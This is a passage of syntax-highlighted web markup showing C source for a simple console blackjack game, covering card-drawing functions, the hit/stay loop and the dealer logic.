|\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Generates random card</span><span class="token punctuation">{</span>     <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>     random_card <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>            <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>         <span class="token keyword">return</span> l<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function   </span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Plays game</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// holds value of player_total</span>     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// counter for asking user to hold or stay (aka game turns)</span>     <span class="token keyword">char</span> choice3<span class="token punctuation">;</span>     cash <span class="token operator">=</span> cash<span class="token punctuation">;</span>     <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nCash: $%d\n"</span><span class="token punctuation">,</span>cash<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints amount of cash user has</span>     <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random card</span>     player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes player total</span>     p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints player total</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes and prints dealer total</span>     <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prompts user to enter bet amount</span>     <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//While loop used to keep asking user to hit or stay at most twenty-one times</span>                  <span class="token comment" spellcheck="true">//  because there is a chance user can generate twenty-one consecutive 1's</span>     <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If user total is 21, win</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is over 21, loss</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWoah Buddy, You Went WAY over.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is less than 21, ask to hit or stay</span>         <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nWould You Like to Hit or Stay?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'h'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>             <span class="token punctuation">{</span>                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please Enter H to Hit or S to Stay.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Hit, continues</span>             <span class="token punctuation">{</span>                  <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span>                 p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Is dealer total is 21, loss</span>                  <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer total is over 21, win</span>                  <span class="token punctuation">{</span>                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has Went Over!. You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Stay, does not continue</span>             <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span><span class="token punctuation">,</span> player_total<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>          <span class="token punctuation">}</span>             i<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//While player total and dealer total are less than 21, re-do while loop </span>     <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End While Loop</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> z<span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>      z<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is 10 or less, keep that value</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span>z<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">></span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is more than 11, change value to 10</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span>      <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>     dealer_total <span class="token operator">=</span> dealer_total <span class="token operator">+</span> d<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThe Dealer Has a Total of %d"</span><span class="token punctuation">,</span> dealer_total<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints dealer total</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function </span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token punctuation">{</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//If stay selected, dealer continues going</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">>=</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">>=</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is more than dealer's total, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is less than dealer's total, loss</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token 